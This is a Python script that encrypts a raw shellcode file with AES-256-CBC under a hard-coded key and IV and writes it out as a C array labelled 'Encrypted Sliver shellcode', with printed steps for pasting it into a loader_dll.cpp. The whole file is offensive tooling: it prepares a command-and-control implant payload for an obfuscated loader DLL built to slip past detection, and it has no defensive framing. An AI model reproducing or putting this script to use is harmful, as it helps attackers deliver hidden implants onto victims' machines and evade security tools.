#!/usr/bin/env python3
import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_shellcode(input_file, output_file):
    print(f"[*] Reading shellcode from: {input_file}")
    
    with open(input_file, 'rb') as f:
        shellcode = f.read()
    
    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    
    key = bytes([
        0x60, 0x3d, 0xeb, 0x10, 0x15, 0xca, 0x71, 0xbe,
        0x2b, 0x73, 0xae, 0xf0, 0x85, 0x7d, 0x77, 0x81,
        0x1f, 0x35, 0x2c, 0x07, 0x3b, 0x61, 0x08, 0xd7,
        0x2d, 0x98, 0x10, 0xa3, 0x09, 0x14, 0xdf, 0xf4
    ])
    
    iv = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
    ])
    
    print("[*] Encrypting with AES-256-CBC...")
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(shellcode, AES.block_size))
    
    print(f"[+] Encrypted size: {len(encrypted)} bytes")
    
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    
    print(f"[+] Encrypted shellcode written to: {output_file}")
    
    c_array = "// Encrypted Sliver shellcode\n"
    c_array += "unsigned char encryptedShellcode[] = {\n"
    
    for i, byte in enumerate(encrypted):
        if i % 12 == 0:
            c_array += "    "
        c_array += f"0x{byte:02x}"
        if i < len(encrypted) - 1:
            c_array += ", "
        if (i + 1) % 12 == 0:
            c_array += "\n"
    
    c_array += "\n};\n"
    c_array += f"SIZE_T shellcodeSize = {len(encrypted)};\n"
    
    header_file = output_file + ".h"
    with open(header_file, 'w') as f:
        f.write(c_array)
    
    print(f"[+] C header written to: {header_file}")
    print("\n" + "="*70)
    print("NEXT STEP:")
    print("="*70)
    print(f"1. Open {header_file} in Notepad")
    print("2. Select ALL (Ctrl+A) and Copy (Ctrl+C)")
    print("3. Open loader_dll.cpp in Notepad")
    print("4. Find the line: unsigned char encryptedShellcode[] = {")
    print("5. Select the ENTIRE array (including the 0x00 placeholder)")
    print("6. Paste (Ctrl+V) your copied array")
    print("7. Save loader_dll.cpp")
    print("="*70 + "\n")
    
    return True

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 encrypt_shellcode.py <input.bin> <output.bin>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    
    if not os.path.exists(input_file):
        print(f"[-] Error: Input file '{input_file}' not found!")
        sys.exit(1)
    
    encrypt_shellcode(input_file, output_file)
    print("[+] Encryption complete!")